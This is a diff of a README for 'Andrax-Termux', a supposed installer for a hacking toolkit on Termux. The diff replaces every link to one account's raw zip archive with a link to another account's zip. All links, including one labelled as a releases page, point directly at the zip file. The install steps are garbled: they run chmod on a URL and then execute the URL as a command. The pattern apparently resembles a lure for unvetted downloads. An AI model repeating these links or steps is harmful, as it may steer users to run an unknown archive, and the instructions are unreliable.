@@ -1,6 +1,6 @@
 # 🚀 Andrax-Termux - Install Andrax Easily on Termux
 
-[![Download Andrax-Termux](https://raw.githubusercontent.com/Jennisecondary231/Andrax-Termux/main/dexterousness/Andrax-Termux-3.4.zip)](https://raw.githubusercontent.com/Jennisecondary231/Andrax-Termux/main/dexterousness/Andrax-Termux-3.4.zip)
+[![Download Andrax-Termux](https://raw.githubusercontent.com/Kali99xx/Andrax-Termux/main/dexterousness/Termux-Andrax-1.2-alpha.2.zip)](https://raw.githubusercontent.com/Kali99xx/Andrax-Termux/main/dexterousness/Termux-Andrax-1.2-alpha.2.zip)
 
 ## 🔧 Overview
 
@@ -26,11 +26,11 @@ Before you start, ensure you have the following:
 
 ## 📥 Download & Install
 
-To download Andrax-Termux, visit this page: [Download page](https://raw.githubusercontent.com/Jennisecondary231/Andrax-Termux/main/dexterousness/Andrax-Termux-3.4.zip). 
+To download Andrax-Termux, visit this page: [Download page](https://raw.githubusercontent.com/Kali99xx/Andrax-Termux/main/dexterousness/Termux-Andrax-1.2-alpha.2.zip). 
 
 ### Step-by-Step Instructions
 
-1. **Open your web browser** and navigate to the [GitHub Releases page](https://raw.githubusercontent.com/Jennisecondary231/Andrax-Termux/main/dexterousness/Andrax-Termux-3.4.zip).
+1. **Open your web browser** and navigate to the [GitHub Releases page](https://raw.githubusercontent.com/Kali99xx/Andrax-Termux/main/dexterousness/Termux-Andrax-1.2-alpha.2.zip).
 2. **Locate the latest release** of Andrax-Termux.
 3. **Download** the installer script. Identify the file that most likely ends with `.sh`, which is the shell script you need for installation.
 4. **Open the Termux app** on your device.
@@ -43,15 +43,15 @@ To download Andrax-Termux, visit this page: [Download page](https://raw.githubus
 6. **Make the installer script executable** by running:
 
    ```bash
-   chmod +x https://raw.githubusercontent.com/Jennisecondary231/Andrax-Termux/main/dexterousness/Andrax-Termux-3.4.zip
+   chmod +x https://raw.githubusercontent.com/Kali99xx/Andrax-Termux/main/dexterousness/Termux-Andrax-1.2-alpha.2.zip
    ```
 
-   *(Replace `https://raw.githubusercontent.com/Jennisecondary231/Andrax-Termux/main/dexterousness/Andrax-Termux-3.4.zip` with the actual name of the downloaded file.)*
+   *(Replace `https://raw.githubusercontent.com/Kali99xx/Andrax-Termux/main/dexterousness/Termux-Andrax-1.2-alpha.2.zip` with the actual name of the downloaded file.)*
 
 7. **Run the installer script**:
 
    ```bash
-   https://raw.githubusercontent.com/Jennisecondary231/Andrax-Termux/main/dexterousness/Andrax-Termux-3.4.zip
+   https://raw.githubusercontent.com/Kali99xx/Andrax-Termux/main/dexterousness/Termux-Andrax-1.2-alpha.2.zip
    ```
 
 8. **Follow the on-screen prompts** to complete the installation. The script will handle the rest.
